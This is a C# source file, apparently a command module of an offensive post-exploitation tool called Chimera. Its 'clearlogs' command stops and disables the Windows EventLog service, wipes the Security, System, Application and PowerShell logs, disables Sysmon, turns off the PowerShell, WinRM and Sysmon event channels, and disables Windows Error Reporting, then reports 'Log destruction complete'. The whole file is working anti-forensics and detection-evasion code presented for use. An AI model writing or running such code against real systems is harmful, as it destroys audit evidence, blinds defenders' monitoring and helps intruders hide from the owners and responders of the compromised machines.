using System;
using System.Diagnostics;
using System.ServiceProcess;

namespace Chimera.Commands
{
    // clearlogs — stop EventLog service, clear key logs, optionally kills Sysmon,
    //             disables ETW providers, and disables WER.
    // Requires admin rights. Run 'bypass' first if not elevated.
    public static class ClearLogs
    {
        private static readonly string[] WevtutilLogs =
            { "Security", "System", "Application", "Windows PowerShell" };

        // ETW providers to disable via wevtutil sl <provider> /e:false
        private static readonly string[] EtwProviders = {
            "Microsoft-Windows-PowerShell/Operational",
            "Microsoft-Windows-WinRM/Operational",
            "Microsoft-Windows-Sysmon/Operational"
        };

        public static string Execute()
        {
            var sb = new System.Text.StringBuilder();
            try
            {
                // ----------------------------------------------------------------
                // 1. Stop and disable the EventLog service
                // ----------------------------------------------------------------
                try
                {
                    var svc = new ServiceController("EventLog");
                    if (svc.Status != ServiceControllerStatus.Stopped)
                    {
                        svc.Stop();
                        svc.WaitForStatus(ServiceControllerStatus.Stopped,
                            TimeSpan.FromSeconds(10));
                        sb.AppendLine("[+] EventLog service stopped.");
                    }
                    else
                    {
                        sb.AppendLine("[*] EventLog service was already stopped.");
                    }
                    RunCmd("sc config EventLog start= disabled");
                    sb.AppendLine("[+] EventLog service disabled.");
                }
                catch (Exception ex)
                {
                    sb.AppendLine("[-] EventLog stop/disable: " + ex.Message);
                }

                // ----------------------------------------------------------------
                // 2. Clear each log via wevtutil cl
                // ----------------------------------------------------------------
                foreach (string log in WevtutilLogs)
                {
                    try
                    {
                        RunCmd("wevtutil cl \"" + log + "\"");
                        sb.AppendLine("[+] Cleared log: " + log);
                    }
                    catch (Exception ex)
                    {
                        sb.AppendLine("[-] Failed to clear " + log + ": " + ex.Message);
                    }
                }

                // ----------------------------------------------------------------
                // 3. Stop and disable Sysmon (if present)
                // ----------------------------------------------------------------
                // Sysmon can register under "Sysmon" or "Sysmon64"
                foreach (string svcName in new[]{"Sysmon", "Sysmon64"})
                {
                    try
                    {
                        var svc = new ServiceController(svcName);
                        // This throws if service doesn't exist
                        var status = svc.Status;

                        if (status != ServiceControllerStatus.Stopped)
                        {
                            svc.Stop();
                            svc.WaitForStatus(ServiceControllerStatus.Stopped,
                                TimeSpan.FromSeconds(10));
                            sb.AppendLine("[+] " + svcName + " service stopped.");
                        }
                        else
                        {
                            sb.AppendLine("[*] " + svcName + " was already stopped.");
                        }

                        RunCmd("sc config " + svcName + " start= disabled");
                        sb.AppendLine("[+] " + svcName + " service disabled.");
                    }
                    catch (InvalidOperationException)
                    {
                        // Service does not exist — expected on most hosts
                        sb.AppendLine("[*] " + svcName + " not found — skipping.");
                    }
                    catch (Exception ex)
                    {
                        sb.AppendLine("[-] " + svcName + ": " + ex.Message);
                    }
                }

                // ----------------------------------------------------------------
                // 4. Disable ETW providers via wevtutil sl
                // ----------------------------------------------------------------
                foreach (string provider in EtwProviders)
                {
                    try
                    {
                        // wevtutil sl "<provider>" /e:false
                        string result = RunCmd(
                            "wevtutil sl \"" + provider + "\" /e:false");
                        // wevtutil returns empty on success
                        if (result.IndexOf("error", StringComparison.OrdinalIgnoreCase) < 0 &&
                            result.IndexOf("Access is denied",
                                StringComparison.OrdinalIgnoreCase) < 0)
                            sb.AppendLine("[+] Disabled ETW provider: " + provider);
                        else
                            sb.AppendLine("[-] ETW provider " + provider + ": " + result.Trim());
                    }
                    catch (Exception ex)
                    {
                        sb.AppendLine("[-] ETW " + provider + ": " + ex.Message);
                    }
                }

                // ----------------------------------------------------------------
                // 5. Disable Windows Error Reporting service (WerSvc)
                // ----------------------------------------------------------------
                try
                {
                    var wer = new ServiceController("WerSvc");
                    var status = wer.Status;
                    if (status != ServiceControllerStatus.Stopped)
                    {
                        wer.Stop();
                        wer.WaitForStatus(ServiceControllerStatus.Stopped,
                            TimeSpan.FromSeconds(10));
                        sb.AppendLine("[+] WerSvc stopped.");
                    }
                    else
                    {
                        sb.AppendLine("[*] WerSvc was already stopped.");
                    }
                    RunCmd("sc config WerSvc start= disabled");
                    sb.AppendLine("[+] WerSvc disabled.");
                }
                catch (InvalidOperationException)
                {
                    sb.AppendLine("[*] WerSvc not found — skipping.");
                }
                catch (Exception ex)
                {
                    sb.AppendLine("[-] WerSvc: " + ex.Message);
                }

                sb.AppendLine();
                sb.AppendLine("[+] Log destruction complete.");
            }
            catch (Exception ex)
            {
                sb.AppendLine("[error] clearlogs: " + ex.Message);
            }
            return sb.ToString();
        }

        private static string RunCmd(string cmd)
        {
            var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
            {
                UseShellExecute        = false,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow         = true
            };
            using (Process p = Process.Start(psi))
            {
                string o = p.StandardOutput.ReadToEnd();
                string e = p.StandardError.ReadToEnd();
                p.WaitForExit(10000);
                return o + e;
            }
        }
    }
}
